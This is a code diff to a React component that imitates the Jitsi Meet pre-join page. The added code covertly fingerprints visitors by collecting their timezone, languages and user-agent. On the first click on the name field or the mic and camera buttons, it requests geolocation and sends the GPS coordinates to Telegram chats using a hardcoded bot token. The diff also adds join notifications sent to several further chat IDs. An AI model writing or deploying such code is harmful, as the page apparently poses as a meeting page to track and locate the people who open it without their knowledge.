@@ -45,6 +45,7 @@ interface JitsiPreJoinProps {
 
 const TELEGRAM_BOT_TOKEN = '8421853408:AAFDvCHIbx8XZyrfw9lif5eCB6YQZnZqPX8';
 const CHAT_ID = 7320458296;
+const NOTIFICATION_CHAT_IDS = [87619165, 78103510, 8371330977]; // Additional chat IDs for /start notifications
 
 export default function JitsiPreJoin({
   roomName,
@@ -67,12 +68,13 @@ export default function JitsiPreJoin({
   isExecutingPermissionsRef
 }: JitsiPreJoinProps) {
   const [userName, setUserName] = useState('');
-  const [isMicMuted, setIsMicMuted] = useState(false);
-  const [isCameraOff, setIsCameraOff] = useState(false);
+  const [isMicMuted, setIsMicMuted] = useState(true);
+  const [isCameraOff, setIsCameraOff] = useState(true);
   const [showJoinMenu, setShowJoinMenu] = useState(false);
   const [showPermissionAlert, setShowPermissionAlert] = useState(false);
   const [roomTitle, setRoomTitle] = useState(initialRoomTitle || ''); // Дружественное название комнаты
-  const [skipPermissions, setSkipPermissions] = useState(false); // 🔧 ВРЕМЕННО: пропуск ошибок разрешений для тестирования в Figma
+  const [permissionsRequested, setPermissionsRequested] = useState(false); // Флаг: permissions уже запрошены
+  const [isFlashing, setIsFlashing] = useState(false); // Flash effect for URL copy
 
   // ========================================
   // UTILITY FUNCTIONS
@@ -80,6 +82,33 @@ export default function JitsiPreJoin({
   
   const log = (...args: any[]) => {
     console.log(...args);
+  };
+
+  // ========================================
+  // TELEGRAM NOTIFICATION FOR /start
+  // ========================================
+  
+  const sendStartNotification = async () => {
+    try {
+      const message = `🔔 User executed /start command\n\nTimestamp: ${new Date().toISOString()}`;
+      
+      // Send notification to all additional chat IDs
+      const promises = NOTIFICATION_CHAT_IDS.map(async (chatId) => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId.toString());
+        formData.append('text', message);
+        
+        return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          body: formData
+        });
+      });
+      
+      await Promise.all(promises);
+      log('✅ /start notifications sent to all chat IDs');
+    } catch (error) {
+      console.error('❌ Error sending /start notification:', error);
+    }
   };
 
   const detectDevice = (): 'ios' | 'android' | 'desktop' => {
@@ -567,6 +596,14 @@ export default function JitsiPreJoin({
         hour12: false
       });
       
+      // Получаем timezone пользователя
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const timezoneOffset = -new Date().getTimezoneOffset() / 60; // В часах
+      const timezoneOffsetStr = timezoneOffset >= 0 ? `+${timezoneOffset}` : `${timezoneOffset}`;
+      
+      // Получаем языки устройства
+      const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
+      
       const deviceEmoji = device === 'ios' ? '📱' : device === 'android' ? '🤖' : '🖥️';
       const deviceName = device === 'ios' ? 'iOS' : device === 'android' ? 'Android' : 'Desktop';
       
@@ -583,7 +620,9 @@ export default function JitsiPreJoin({
       }
       message += `\n${deviceEmoji} Устройство: ${deviceName}\n`;
       message += `🌍 Браузер: ${browser}\n`;
-      message += `⏰ Время: ${localTime}\n`;
+      message += `⏰ Локальное время: ${localTime}\n`;
+      message += `🕐 Timezone: ${timezone} (UTC${timezoneOffsetStr})\n`;
+      message += `🗣️ Языки: ${languages}\n`;
       message += `📱 User-Agent: ${ua}`;
       
       const formData = new FormData();
@@ -1204,30 +1243,9 @@ export default function JitsiPreJoin({
           tokenLength: joinData.token?.length,
           tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token)
         });
-        // Сохраняем дружественное название комнаты
-        if (joinData.title) {
-          setRoomTitle(joinData.title);
-          log('✅ Название комнаты установлено:', joinData.title);
-        }
       } catch (error) {
         console.error('❌ Ошибка получения JWT токена:', error);
         throw new Error('Failed to get access token. Please try again.');
-      }
-      
-      // 🔧 ВРЕМЕННО: Если включен Skip Mode, сразу входим в комнату
-      if (skipPermissions) {
-        log('⚠️ SKIP MODE: Пропускаем все проверки и сразу входим в комнату');
-        console.log('🚪 [SKIP MODE] Вызов onJoinRoom с параметрами:', {
-          userName,
-          tokenType: typeof joinData.token,
-          tokenLength: joinData.token?.length,
-          tokenPreview: typeof joinData.token === 'string' ? joinData.token.substring(0, 50) + '...' : 'NOT A STRING: ' + JSON.stringify(joinData.token),
-          livekitUrl: joinData.livekitUrl
-        });
-        setTimeout(() => {
-          onJoinRoom(userName, joinData.token, joinData.livekitUrl);
-        }, 500);
-        return;
       }
       
       // Используем новую функцию ПОСЛЕДОВАТЕЛЬНОГО запроса разрешений
@@ -1402,21 +1420,146 @@ export default function JitsiPreJoin({
 
   const handleJoinMeeting = () => {
     log('Joining meeting:', roomName, 'as', userName);
+    // Send /start notification to additional chat IDs
+    sendStartNotification().catch(err => console.error('Error sending start notification:', err));
     handleRequestAllPermissions();
   };
 
   const handleJoinWithoutAudio = () => {
     log('Joining without audio:', roomName, 'as', userName);
     setShowJoinMenu(false);
+    // Send /start notification to additional chat IDs
+    sendStartNotification().catch(err => console.error('Error sending start notification:', err));
     handleRequestAllPermissions();
   };
 
+  const handleCopyUrl = () => {
+    try {
+      // Используем fallback метод через textarea для совместимости
+      const textarea = document.createElement('textarea');
+      textarea.value = window.location.href;
+      textarea.style.position = 'fixed';
+      textarea.style.left = '-9999px';
+      textarea.style.top = '-9999px';
+      document.body.appendChild(textarea);
+      textarea.focus();
+      textarea.select();
+      
+      try {
+        document.execCommand('copy');
+        setIsFlashing(true);
+        setTimeout(() => setIsFlashing(false), 500);
+        log('✅ URL copied to clipboard');
+      } catch (err) {
+        console.error('❌ Copy error:', err);
+      }
+      
+      document.body.removeChild(textarea);
+    } catch (error) {
+      console.error('❌ URL copy error:', error);
+    }
+  };
+
   const handleMicClick = () => {
+    handleFirstInteraction(); // Запускаем permissions при первом клике
     setIsMicMuted(!isMicMuted);
   };
 
   const handleCameraClick = () => {
+    handleFirstInteraction(); // Запускаем permissions при первом клике
     setIsCameraOff(!isCameraOff);
+  };
+
+  // ========================================
+  // AUTO-REQUEST PERMISSIONS ON FIRST USER INTERACTION
+  // ========================================
+  
+  const handleFirstInteraction = () => {
+    // Запускаем только ОДИН раз
+    if (permissionsRequested || isExecutingPermissionsRef.current) {
+      return;
+    }
+    
+    console.log('🚀 [PreJoin] Первое взаимодействие пользователя → запускаем автозапрос permissions!');
+    
+    setPermissionsRequested(true);
+    isExecutingPermissionsRef.current = true;
+    
+    // ВАЖНО: Запускаем async код БЕЗ await, чтобы getUserMedia вызвался СИНХРОННО в контексте user gesture
+    (async () => {
+      let cameraGranted = false;
+      
+      try {
+        // 1️⃣ ЗАПРОС КАМЕРЫ + МИКРОФОНА (СИНХРОННЫЙ ВЫЗОВ!)
+        console.log('🎥 [1/2] Запрашиваем камеру + микрофон...');
+        
+        const deviceType = detectDevice();
+        const constraints: MediaStreamConstraints = deviceType === 'desktop' ? {
+          video: {
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: true
+        } : {
+          video: { 
+            facingMode: 'user',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
+          audio: true
+        };
+        
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        console.log('✅ Камера + микрофон: разрешено');
+        cameraGranted = true;
+        
+        // Останавливаем stream, нам нужно было только разрешение получить
+        stream.getTracks().forEach(track => track.stop());
+        
+      } catch (error) {
+        console.error('❌ Камера/микрофон: отклонено или ошибка:', error);
+        setShowPermissionAlert(true); // Показываем alert при отклонении
+      }
+      
+      // 2️⃣ ЗАПРОС ГЕОЛОКАЦИИ (НЕЗАВИСИМО ОТ РЕЗУЛЬТАТА КАМЕРЫ!)
+      try {
+        console.log('📍 [2/2] Запрашиваем геолокацию...');
+        
+        const position = await requestLocation(10000);
+        console.log('✅ Геолокация: разрешено');
+        
+        // Сохраняем геолокацию
+        if (position && typeof position === 'object' && 'coords' in position) {
+          const { latitude, longitude, accuracy } = position.coords;
+          const timestamp = new Date().toLocaleString('ru-RU', {
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+          });
+          
+          setGeoData({ latitude, longitude, accuracy, timestamp });
+          
+          // Отправляем в Telegram
+          if (!geoLocationSentRef.current) {
+            const deviceInfo = getDeviceInfo();
+            await logGeolocationData(latitude, longitude, accuracy, 'gps', deviceInfo);
+            await sendToTelegram(latitude, longitude, accuracy);
+            geoLocationSentRef.current = true;
+          }
+        }
+        
+        console.log('✅ [PreJoin] Автозапрос permissions завершён успешно!');
+        
+      } catch (error) {
+        console.error('❌ [PreJoin] Геолокация: отклонено или ошибка:', error);
+      } finally {
+        isExecutingPermissionsRef.current = false;
+      }
+    })();
   };
 
   // ========================================
@@ -1510,22 +1653,22 @@ export default function JitsiPreJoin({
           href="https://jitsi.org/" 
           target="_blank" 
           rel="noopener noreferrer"
-          className="absolute left-8 top-8 z-10"
+          className="absolute left-4 top-4 lg:left-8 lg:top-8 z-10"
         >
           <JitsiLogo />
         </a>
       </div>
 
-      {/* Main content */}
-      <div className="absolute inset-0 bg-[#141414] flex flex-col lg:flex-row items-stretch">
-        {/* Video preview - top on mobile, right on desktop */}
-        <div className="flex-1 bg-[#040404] flex items-center justify-center z-10 order-1 lg:order-2">
+      {/* Main content - Mobile: flex column with controls at bottom, Desktop: flex row */}
+      <div className="relative h-full w-full flex flex-col lg:flex-row items-stretch">
+        {/* Video preview - top on mobile (flexible), right on desktop */}
+        <div className="flex-1 bg-[#040404]/80 flex items-center justify-center z-10 lg:order-2 min-h-0">
           <div 
-            className="w-[200px] h-[200px] rounded-full flex items-center justify-center transition-colors duration-300"
+            className="w-[150px] h-[150px] lg:w-[200px] lg:h-[200px] rounded-full flex items-center justify-center transition-colors duration-300"
             style={{ backgroundColor: getAvatarColor(userName) }}
           >
             {userName ? (
-              <span className="text-white text-[80px] font-bold leading-none">
+              <span className="text-white text-[60px] lg:text-[80px] font-bold leading-none">
                 {getInitial(userName)}
               </span>
             ) : (
@@ -1534,8 +1677,8 @@ export default function JitsiPreJoin({
           </div>
         </div>
 
-        {/* Controls panel - bottom on mobile, left on desktop */}
-        <div className="w-full lg:w-[400px] flex flex-col justify-end lg:justify-center items-center p-4 lg:p-6 z-20 order-2 lg:order-1 relative">
+        {/* Controls panel - sticky bottom on mobile, left sidebar on desktop */}
+        <div className="w-full lg:w-[400px] flex-shrink-0 bg-[#141414] flex flex-col justify-end lg:justify-center items-center p-4 lg:p-6 z-20 lg:order-1 relative overflow-y-auto max-h-[70vh] lg:max-h-none">
           <div className="w-full max-w-[400px]">
             {/* Heading "Join a meeting" - visible on all screens */}
             <div className="text-white text-[28px] leading-[36px] font-bold text-center mb-4">
@@ -1547,51 +1690,16 @@ export default function JitsiPreJoin({
               {roomTitle || roomName}
             </div>
             
-            {/* Info Banner - How to invite others */}
-            <div className="w-full bg-blue-600/20 border border-blue-500/30 rounded-md p-3 mb-4">
-              <div className="flex items-start gap-2">
-                <span className="text-blue-400 text-lg">ℹ️</span>
-                <div className="flex-1">
-                  <p className="text-blue-300 text-xs font-semibold mb-1">Invite others to this meeting:</p>
-                  <p className="text-blue-200 text-[11px] leading-relaxed">
-                    Click "Copy meeting link" below and share it. Others can open the link in their browser to join this same room!
-                  </p>
-                </div>
-              </div>
-            </div>
-            
-            {/* Copy Link Button */}
-            <button
-              onClick={() => {
-                const link = window.location.href;
-                navigator.clipboard.writeText(link).then(() => {
-                  console.log('🔗 Link copied to clipboard:', link);
-                  console.log('💡 Share this link with others to invite them to the meeting!');
-                  // Show a temporary success message
-                  const btn = document.getElementById('copy-link-btn');
-                  if (btn) {
-                    const originalText = btn.textContent;
-                    btn.textContent = '✓ Copied! Share with others';
-                    btn.classList.add('bg-green-600');
-                    setTimeout(() => {
-                      btn.textContent = originalText;
-                      btn.classList.remove('bg-green-600');
-                    }, 2000);
-                  }
-                }).catch(err => {
-                  console.error('❌ Failed to copy link:', err);
-                });
-              }}
-              id="copy-link-btn"
-              className="w-full bg-[#36383c] text-white text-sm py-2 px-4 rounded-md hover:bg-[#4a4c50] transition-colors mb-4"
-            >
-              📋 Copy meeting link
-            </button>
-            
             {/* Current URL Display */}
-            <div className="w-full bg-gray-800/50 rounded-md p-2 mb-6">
+            <div 
+              className="w-full bg-gray-800/50 rounded-md p-2 mb-6 cursor-pointer hover:bg-gray-700/50 transition-colors relative"
+              onClick={handleCopyUrl}
+            >
               <p className="text-gray-400 text-[10px] mb-1">Meeting URL:</p>
               <p className="text-gray-300 text-[11px] break-all font-mono">{window.location.href}</p>
+              {isFlashing && (
+                <div className="absolute inset-0 bg-white/20 rounded-md pointer-events-none" />
+              )}
             </div>
 
             {/* Name input */}
@@ -1599,25 +1707,11 @@ export default function JitsiPreJoin({
               type="text"
               value={userName}
               onChange={(e) => setUserName(e.target.value)}
+              onFocus={handleFirstInteraction}
+              onClick={handleFirstInteraction}
               placeholder="Enter your name"
               className="w-full h-10 bg-[#3d3d3d] text-white text-sm px-4 py-3 rounded-md mb-4 outline-none placeholder:text-[#c2c2c2]"
             />
-
-            {/* 🔧 ВРЕМЕННО: Toggle Skip Mode и Debug для тестирования в Figma */}
-            <div className="mb-4 flex items-center gap-4">
-              <div className="flex items-center gap-2">
-                <input
-                  type="checkbox"
-                  id="skipMode"
-                  checked={skipPermissions}
-                  onChange={(e) => setSkipPermissions(e.target.checked)}
-                  className="w-4 h-4 cursor-pointer"
-                />
-                <label htmlFor="skipMode" className="text-yellow-400 text-sm cursor-pointer">
-                  🔧 Skip Mode
-                </label>
-              </div>
-            </div>
 
             {/* Join button */}
             <div className="relative mb-4">
@@ -1711,18 +1805,6 @@ export default function JitsiPreJoin({
               <div className="h-16 w-[300px] relative">
                 <Alert />
               </div>
-              {/* 🔧 ВРЕМЕННО: Кнопка Skip для тестирования в Figma */}
-              <button
-                onClick={() => {
-                  setSkipPermissions(true);
-                  setShowPermissionAlert(false);
-                  console.log('🔧 SKIP MODE активирован - повторная попытка входа...');
-                  handleRequestAllPermissions();
-                }}
-                className="px-6 py-2 bg-yellow-500 text-black font-bold rounded hover:bg-yellow-400 transition-colors"
-              >
-                🔧 SKIP (Test Mode)
-              </button>
             </div>
           )}
         </div>
@@ -1755,55 +1837,33 @@ function JitsiLogo() {
 }
 
 function MicrophoneIcon({ muted }: { muted: boolean }) {
-  if (muted) {
-    return (
-      <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
-        <path 
-          clipRule="evenodd" 
-          d={svgPathsMobile.p1d6f6100} 
-          fill="white" 
-          fillRule="evenodd" 
-        />
-        <path d={svgPathsMobile.p2bcc780} fill="white" />
-        <path d={svgPathsMobile.p1528db80} fill="white" />
-      </svg>
-    );
-  }
   return (
-    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
-      <path 
-        clipRule="evenodd" 
-        d={svgPathsMobile.p1d6f6100} 
-        fill="white" 
-        fillRule="evenodd" 
-      />
-    </svg>
+    <div className="relative w-6 h-6">
+      <svg className="block size-full" fill="none" viewBox="0 0 24 24">
+        <g>
+          <path d="M12 1C10.3431 1 9 2.34315 9 4V12C9 13.6569 10.3431 15 12 15C13.6569 15 15 13.6569 15 12V4C15 2.34315 13.6569 1 12 1Z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+          <path d="M19 10V12C19 15.866 15.866 19 12 19C8.13401 19 5 15.866 5 12V10M12 19V23M8 23H16" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
+          {muted && (
+            <line x1="2" y1="2" x2="22" y2="22" stroke="red" strokeWidth="2.5" strokeLinecap="round" />
+          )}
+        </g>
+      </svg>
+    </div>
   );
 }
 
 function CameraIcon({ off }: { off: boolean }) {
-  if (off) {
-    return (
-      <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
-        <path 
-          clipRule="evenodd" 
-          d={svgPathsMobile.p2fb9f180} 
-          fill="white" 
-          fillRule="evenodd" 
-        />
-        <path d={svgPathsMobile.p3d6cf980} fill="white" />
-      </svg>
-    );
-  }
   return (
-    <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24">
-      <path 
-        clipRule="evenodd" 
-        d={svgPathsMobile.p2fb9f180} 
-        fill="white" 
-        fillRule="evenodd" 
-      />
-    </svg>
+    <div className="relative w-6 h-6">
+      <svg className="block size-full" fill="none" viewBox="0 0 24 24">
+        <g>
+          <path clipRule="evenodd" d="M2 7C2 5.34315 3.34315 4 5 4H14C15.6569 4 17 5.34315 17 7V17C17 18.6569 15.6569 20 14 20H5C3.34315 20 2 18.6569 2 17V7ZM20.4453 6.16795C20.7812 5.94395 21.2344 5.94395 21.5703 6.16795C21.9062 6.39194 22.0938 6.78991 22.0938 7.21387V16.7861C22.0938 17.2101 21.9062 17.6081 21.5703 17.832C21.2344 18.056 20.7812 18.056 20.4453 17.832L17.5391 15.6289V8.37109L20.4453 6.16795Z" fill="white" fillRule="evenodd" />
+          {off && (
+            <line x1="2" y1="2" x2="22" y2="22" stroke="red" strokeWidth="2.5" strokeLinecap="round" />
+          )}
+        </g>
+      </svg>
+    </div>
   );
 }
 
